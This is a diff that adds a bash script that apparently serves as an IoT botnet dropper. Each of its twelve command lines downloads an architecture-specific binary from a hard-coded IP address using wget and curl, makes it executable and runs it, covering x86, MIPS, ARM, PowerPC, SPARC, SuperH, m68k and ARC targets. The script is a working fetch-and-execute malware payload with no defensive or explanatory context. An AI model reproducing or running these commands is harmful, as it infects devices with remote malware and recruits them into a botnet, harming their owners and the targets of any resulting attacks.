@@ -1,0 +1,13 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.i586; curl -O http://45.145.185.94/Otpzl/7rtya.i586;cat 7rtya.i586 >95bS;chmod +x *;./95bS Selfrep.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.mips; curl -O http://45.145.185.94/Otpzl/7rtya.mips;cat 7rtya.mips >95bS;chmod +x *;./95bS mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.mips64; curl -O http://45.145.185.94/Otpzl/7rtya.mips64;cat 7rtya.mips64 >95bS;chmod +x *;./95bS mips64
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.mpsl; curl -O http://45.145.185.94/Otpzl/7rtya.mpsl;cat 7rtya.mpsl >95bS;chmod +x *;./95bS mipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.arm4; curl -O http://45.145.185.94/Otpzl/7rtya.arm4;cat 7rtya.arm4 >95bS;chmod +x *;./95bS armv4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.arm5; curl -O http://45.145.185.94/Otpzl/7rtya.arm5;cat 7rtya.arm5 >95bS;chmod +x *;./95bS armv5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.arm6; curl -O http://45.145.185.94/Otpzl/7rtya.arm6;cat 7rtya.arm6 >95bS;chmod +x *;./95bS armv6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.ppc; curl -O http://45.145.185.94/Otpzl/7rtya.ppc;cat 7rtya.ppc >95bS;chmod +x *;./95bS powerpc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.m68k; curl -O http://45.145.185.94/Otpzl/7rtya.m68k;cat 7rtya.m68k >95bS;chmod +x *;./95bS motorola
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.sh4; curl -O http://45.145.185.94/Otpzl/7rtya.sh4;cat 7rtya.sh4 >95bS;chmod +x *;./95bS superh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.spc; curl -O http://45.145.185.94/Otpzl/7rtya.spc;cat 7rtya.spc >95bS;chmod +x *;./95bS sparc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.145.185.94/Otpzl/7rtya.arc; curl -O http://45.145.185.94/Otpzl/7rtya.arc;cat 7rtya.arc >95bS;chmod +x *;./95bS ARC7000
